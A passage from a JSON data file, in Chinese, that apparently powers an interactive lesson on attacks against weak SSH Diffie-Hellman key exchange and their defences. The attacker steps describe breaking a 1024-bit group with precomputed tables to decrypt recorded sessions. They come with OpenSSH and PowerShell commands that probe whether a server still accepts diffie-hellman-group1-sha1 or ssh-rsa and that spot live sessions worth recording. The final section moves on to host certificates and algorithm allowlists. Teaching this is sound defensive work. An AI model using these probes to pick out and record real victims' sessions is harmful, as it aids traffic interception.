K","evil":true,"hl":["Cookie","encryption_algorithms_c2s"],"vals":{"Cookie":"由表反推","encryption_algorithms_c2s":"aes128-ctr"},"say":"用预计算表从录到的交换值直接解出 K，不需要服务器私钥。","sub":"前向保密在这里失效，因为群太小。"},{"who":"攻击者","to":"—","pkt":1,"bubble":"解密历史流量","evil":true,"hl":["mac_algorithms_c2s","encryption_algorithms_c2s"],"vals":{"mac_algorithms_c2s":"hmac-sha2-256","encryption_algorithms_c2s":"aes128-ctr"},"say":"由 K 与 H 推出两个方向的密钥，录下的会话逐包还原。","sub":"全程离线，受害者永远不会知道自己被解过。"}],"cmds":{"linux":[{"c":"ssh -Q kex | tr ' ' '\\n' | grep -Ei 'group1|group14-sha1'","n":"在支持清单里找 1024 位群与 SHA-1，有输出就是隐患","s":"补充（OpenSSH -Q 查询）"},{"c":"ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -v user@192.0.2.10","n":"显式指定弱算法；能连上说明服务器仍接受，录包即可预计算","s":"补充（OpenSSH 客户端选项）"},{"c":"ssh -o HostKeyAlgorithms=ssh-rsa -v user@192.0.2.10","n":"试 SHA-1 签名的主机密钥算法，-v 输出里能看到协商结果","s":"补充（OpenSSH 客户端选项）"}],"ps":[{"c":"(Get-Content $HOME\\.ssh\\known_hosts) -match 'ssh-rsa'","n":"看 known_hosts 里是否还存着 SHA-1 的主机密钥条目","s":"《系统》PowerShell.md · 10. Cmdlet 网络与系统管理"}],"cmd":[{"c":"netstat -an | findstr :22","n":"确认会话已建立，再决定这条流值不值得录","s":"《系统》Windows CMD.md · netstat"}]}}]},{"key":"defend","no":"第 3 幕","title":"防护在哪一步掐断它","desc":"把「第一次连的是谁」交给 CA，把「能谈到多弱」交给白名单","lead":"两道闸分别管身份与算法，缺一条整条信任链就不成立。","scenes":[{"name":"主机证书 + 算法白名单","steps":[{"who":"服务器","to":"客户端","pkt":0,"bubble":"主机证书","hl":["Proto Version","Software Version"],"vals":{"Proto Version":"2.0","Software Version":"OpenSSH_9.6"},"say":"主机密钥由内部 CA 签发证书，客户端只信任 CA 公钥。","sub":"轮换主机密钥只需重签，客户端不用改。"},{"who":"客户端","to":"服务器","pkt":0,"bubble":"校验证书链","hl":["Proto
